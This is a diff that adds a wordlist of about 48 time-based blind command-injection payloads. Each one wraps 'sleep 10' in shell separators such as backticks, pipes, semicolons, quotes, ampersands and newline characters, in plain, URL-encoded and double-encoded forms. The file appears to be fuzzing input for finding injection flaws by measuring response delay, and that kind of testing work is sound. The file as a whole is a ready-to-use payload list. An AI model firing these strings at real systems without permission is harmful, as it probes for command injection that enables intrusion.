@@ -1,0 +1,48 @@
+` sleep 10
+|| sleep 10
+| sleep 10
+; sleep 10
+' sleep 10
+'" sleep 10
+" sleep 10
+"' sleep 10
+& sleep 10
+&& sleep 10
+%0a sleep 10
+%0a%0d sleep 10
+%60%20sleep%2010%0A
+%7C%7C%20sleep%2010
+%7C%20sleep%2010
+%3B%20sleep%2010
+%27%20sleep%2010
+%27%22%20sleep%2010
+%22%20sleep%2010
+%22%27%20sleep%2010
+%26%20sleep%2010
+%26%26%20sleep%2010
+%250a%20sleep%2010
+%250a%250d%20sleep%2010
+` sleep 10 `
+|| sleep 10 ||
+| sleep 10 |
+; sleep 10 ;
+' sleep 10 '
+'" sleep 10 '"
+" sleep 10 "
+"' sleep 10 "'
+& sleep 10 &
+&& sleep 10 &&
+%0a sleep 10 %0a
+%0a%0d sleep 10 %0a%0d
+%60%20sleep%2010%20%60%0A
+%7C%7C%20sleep%2010%20%7C%7C
+%7C%20sleep%2010%20%7C
+%3B%20sleep%2010%20%3B
+%27%20sleep%2010%20%27
+%27%22%20sleep%2010%20%27%22
+%22%20sleep%2010%20%22
+%22%27%20sleep%2010%20%22%27
+%26%20sleep%2010%20%26
+%26%26%20sleep%2010%20%26%26
+%250a%20sleep%2010%20%250a
+%250a%250d%20sleep%2010%20%250a%250d
